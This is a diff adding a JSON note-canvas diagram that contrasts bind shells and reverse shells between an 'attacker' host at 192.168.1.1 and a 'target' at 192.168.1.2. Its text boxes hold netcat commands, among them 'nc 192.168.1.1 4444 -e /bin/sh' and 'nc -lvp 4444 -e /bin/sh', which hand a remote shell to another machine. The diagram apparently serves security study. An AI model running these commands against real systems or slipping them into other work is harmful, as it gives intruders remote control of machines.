@@ -1,0 +1,18 @@
+{
+	"nodes":[
+		{"id":"a39a4d6b50735f82","type":"group","x":-680,"y":-20,"width":1380,"height":260,"label":"Bind shell"},
+		{"id":"3cb0c393c1ca0c5d","type":"group","x":-680,"y":-360,"width":1380,"height":260,"label":"Reverse shell"},
+		{"id":"910928dbf043dc33","type":"group","x":180,"y":40,"width":480,"height":140,"color":"5","label":"Target 192.168.1.2"},
+		{"id":"a2bb722645fc6b22","type":"group","x":180,"y":-300,"width":480,"height":140,"color":"5","label":"Target 192.168.1.2"},
+		{"id":"9baf6db9625e281d","type":"group","x":-660,"y":40,"width":400,"height":140,"color":"1","label":"Attacker 192.168.1.1"},
+		{"id":"b206ea1d867a758a","type":"group","x":-660,"y":-300,"width":400,"height":140,"color":"1","label":"Attacker 192.168.1.1"},
+		{"id":"78f0aac417a4f0fc","type":"text","text":"```bash\nnc 192.168.1.2 4444\n```","x":-640,"y":80,"width":319,"height":60},
+		{"id":"586825037a4ca218","type":"text","text":"```bash\nnc -lvp 4444 -e /bin/sh\n```","x":228,"y":80,"width":383,"height":60},
+		{"id":"5bd214f661e30ece","type":"text","text":"```bash\nnc 192.168.1.1 4444 -e /bin/sh\n```","x":228,"y":-260,"width":383,"height":60},
+		{"id":"605269c04ed3ce33","type":"text","text":"```bash\nnc -lvp 4444\n```","x":-640,"y":-260,"width":319,"height":60}
+	],
+	"edges":[
+		{"id":"39c0895d0875b034","fromNode":"9baf6db9625e281d","fromSide":"right","toNode":"910928dbf043dc33","toSide":"left","color":"4","label":"TCP connection port 4444"},
+		{"id":"ae33e51e3ed5be51","fromNode":"a2bb722645fc6b22","fromSide":"left","toNode":"b206ea1d867a758a","toSide":"right","color":"2","label":"TCP connection port 4444"}
+	]
+}
